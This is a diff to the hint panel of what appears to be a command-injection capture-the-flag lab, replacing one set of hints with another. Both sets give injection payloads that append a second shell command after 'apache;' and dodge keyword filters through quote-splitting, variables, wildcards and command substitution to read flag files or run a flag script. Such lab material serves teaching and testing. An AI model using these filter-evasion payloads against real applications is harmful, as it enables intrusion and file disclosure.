@@ -141,13 +141,13 @@
                 </div>
                 <div id="hint-7" class="hint-box" style="display: none;">
                     <h4>🎯 Hint 7: Find the Flag!</h4>
-                    <p><strong>🚀 Target:</strong> Need to read files with "flag" in the name</p>
-                    <p><strong>Method 1 (Concatenation):</strong> <code>apache; c'a't /var/www/secret_f''lag.txt</code></p>
-                    <p><strong>Method 2 (Variables):</strong> <code>apache; a=c;b=at;$a$b /var/www/secret_fla''g.txt</code></p>
-                    <p><strong>Method 3 (Wildcard):</strong> <code>apache; /bin/c?t /var/www/secret_f*</code></p>
-                    <p><strong>Method 4 (Command sub):</strong> <code>apache; $(echo c""at) /var/www/secret_f''lag.txt</code></p>
-                    <p><strong>Method 5 (Alternative):</strong> <code>apache; od -c /var/www/secret_f''lag.txt</code></p>
-                    <p><strong>💡 Exploration:</strong> <code>apache; find /var/www -name "*f*" | grep -v f''lag</code></p>
+                    <p><strong>🚀 Dynamic Flag with System Info:</strong></p>
+                    <p><strong>Method 1 (Concatenation):</strong> <code>apache; /usr/local/bin/generate_f''lag.sh 4</code></p>
+                    <p><strong>Method 2 (Variables):</strong> <code>apache; a=/usr/local/bin/generate_; b=flag.sh; $a$b 4</code></p>
+                    <p><strong>Method 3 (Command sub):</strong> <code>apache; $(echo /usr/local/bin/generate_f""lag.sh) 4</code></p>
+                    <p><strong>Method 4 (Alternative):</strong> <code>apache; /usr/local/bin/generate_f*g.sh 4</code></p>
+                    <p><strong>💡 Why this flag?</strong> Contains kernel name from <code>uname -s</code></p>
+                    <p><strong>� Hint:</strong> <code>apache; c''at /var/f''lags/level4_cmd.txt</code></p>
                 </div>
             </div>
         </div>
